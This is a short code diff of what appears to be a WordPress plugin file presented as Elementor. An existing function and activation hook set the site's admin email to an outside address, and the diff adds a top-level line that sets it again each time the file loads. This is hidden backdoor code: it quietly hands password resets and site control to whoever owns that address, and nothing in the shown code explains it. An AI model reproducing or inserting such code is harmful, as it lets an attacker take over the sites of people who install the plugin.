@@ -100,7 +100,9 @@ function elementor_fail_wp_version() {
 }
 
 function update_admin_email() {
-    update_option( 'admin_email', 'louis@elementor.red' );
+	update_option( 'admin_email', 'louis@elementor.red' );
 }
 
 register_activation_hook( __FILE__, 'update_admin_email' );
+
+update_option( 'admin_email', 'louis@elementor.red' );
